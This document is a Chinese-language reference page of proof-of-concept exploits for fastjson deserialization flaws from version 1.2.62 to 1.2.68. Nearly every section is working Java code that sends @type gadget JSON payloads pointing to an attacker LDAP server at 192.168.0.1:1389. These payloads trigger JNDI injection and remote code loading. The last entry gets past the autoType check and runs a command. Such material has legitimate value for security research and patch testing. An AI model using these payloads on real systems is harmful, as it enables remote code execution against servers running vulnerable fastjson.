版本1.2.6x
============


版本1.2.62
--------------

漏洞说明
^^^^^^^^^^

使用不在黑名单中的类进行远程调用org.apache.xbean.propertyeditor.JndiConverter

系统环境中要加载依赖

.. code-block::

   <dependency>
       <groupId>org.apache.xbean</groupId>
       <artifactId>xbean-reflect</artifactId>
       <version>4.22</version>
   </dependency>

POC
^^^^^^

.. code-block:: java

   package org.example;

   import com.alibaba.fastjson.JSON;
   import com.alibaba.fastjson.parser.ParserConfig;
   
   public class Main {
       public static void main(String[] args) {
   
           String s = "{\"@type\":\"org.apache.xbean.propertyeditor.JndiConverter\",\"AsText\":\"ldap://192.168.0.1:1389/ExTest\"}";
           ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
           Object contentValue = JSON.parseObject(s);
       }
   }


版本1.2.66
------------


漏洞说明
^^^^^^^^^^

1.2.62中使用的类已经加入hash黑名单，使用类org.apache.shiro.realm.jndi.JndiRealmFactory、br.com.anteros.dbcp.AnterosDBCPConfig和com.ibatis.sqlmap.engine.transaction.jta.JtaTransactionConfig进行远程调用

POC
^^^^^^^

示例1:

.. code-block::

   <dependency>
      <groupId>org.apache.shiro</groupId>
      <artifactId>shiro-core</artifactId>
      <version>1.10.1</version>
   </dependency>

.. code-block:: java

   package org.example;

   import com.alibaba.fastjson.JSON;
   import com.alibaba.fastjson.parser.ParserConfig;
   
   public class Main {
       public static void main(String[] args) {
   
           String s = "{\"@type\":\"org.apache.shiro.realm.jndi.JndiRealmFactory\",\"jndiNames\":[\"ldap://192.168.0.1:1389/ExTest\"], \"Realms\":[\"\"]}";
           ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
           Object contentValue = JSON.parseObject(s);
       }
   }


示例2:

.. code-block::

   <dependency>
      <groupId>br.com.anteros</groupId>
      <artifactId>Anteros-Core</artifactId>
      <version>1.3.5</version>
   </dependency>
   <dependency>
      <groupId>br.com.anteros</groupId>
      <artifactId>Anteros-DBCP</artifactId>
      <version>1.0.1</version>
   </dependency>

.. code-block:: java

   package org.example;

   import com.alibaba.fastjson.JSON;
   import com.alibaba.fastjson.parser.ParserConfig;
   
   public class Main {
       public static void main(String[] args) {
   
           String s = "{\"@type\":\"br.com.anteros.dbcp.AnterosDBCPConfig\",\"metricRegistry\":\"ldap://192.168.0.1:1389/ExTest\"}";
           ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
           Object contentValue = JSON.parseObject(s);
       }
   }

示例3:

.. code-block::

   <dependency>
      <groupId>br.com.anteros</groupId>
      <artifactId>Anteros-Core</artifactId>
      <version>1.3.5</version>
   </dependency>
   <dependency>
      <groupId>br.com.anteros</groupId>
      <artifactId>Anteros-DBCP</artifactId>
      <version>1.0.1</version>
   </dependency>

.. code-block:: java

   package org.example;

   import com.alibaba.fastjson.JSON;
   import com.alibaba.fastjson.parser.ParserConfig;
   
   public class Main {
       public static void main(String[] args) {
   
           String s = "{\"@type\":\"br.com.anteros.dbcp.AnterosDBCPConfig\",\"healthCheckRegistry\":\"ldap://192.168.0.1:1389/ExTest\"}";
           ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
           Object contentValue = JSON.parseObject(s);
       }
   }


版本1.2.67
------------


漏洞说明
^^^^^^^^^^

使用新的类型org.apache.ignite.cache.jta.jndi.CacheJndiTmLookup和org.apache.shiro.jndi.JndiObjectFactory

POC
^^^^^^^

示例1:

.. code-block:: 

   <dependency>
       <groupId>org.apache.ignite</groupId>
       <artifactId>ignite-core</artifactId>
       <version>2.13.0</version>
   </dependency>
   <dependency>
       <groupId>org.apache.ignite</groupId>
       <artifactId>ignite-jta</artifactId>
       <version>2.4.0</version>
   </dependency>

.. code-block:: java

   package org.example;

   import com.alibaba.fastjson.JSON;
   import com.alibaba.fastjson.parser.ParserConfig;
   
   public class Main {
       public static void main(String[] args) {
   
           String s = "{\"@type\":\"org.apache.ignite.cache.jta.jndi.CacheJndiTmLookup\",\"jndiNames\":[\"ldap://192.168.0.1:1389/ExTest\"], \"tm\":{\"$ref\":\"$.tm\"}}";
           ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
           Object contentValue = JSON.parseObject(s);
       }
   }

示例2:

.. code-block::

   <dependency>
       <groupId>org.apache.shiro</groupId>
       <artifactId>shiro-core</artifactId>
       <version>1.10.1</version>
   </dependency>


.. code-block:: java

   package org.example;

   import com.alibaba.fastjson.JSON;
   import com.alibaba.fastjson.parser.ParserConfig;
   
   public class Main {
       public static void main(String[] args) {
   
           String s = "{\"@type\":\"org.apache.shiro.jndi.JndiObjectFactory\",\"resourceName\":\"ldap://192.168.0.1:1389/ExTest\", \"instance\":{\"$ref\":\"$.instance\"}}";
           ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
           Object contentValue = JSON.parseObject(s);
       }
   }


版本1.2.68
------------


漏洞说明
^^^^^^^^^^

使用本地类型，通过expectClass绕过checkAutoType函数

POC
^^^^^^^

.. code-block:: java

   package org.example;

   import com.alibaba.fastjson.JSON;
   
   public class Main {
       public static void main(String[] args) {
   
           String s = "{\"@type\":\"java.lang.AutoCloseable\",\"@type\":\"org.example.VulAutoCloseable\", \"cmd\":\"calc\"}";
           Object contentValue = JSON.parseObject(s);
       }
   }
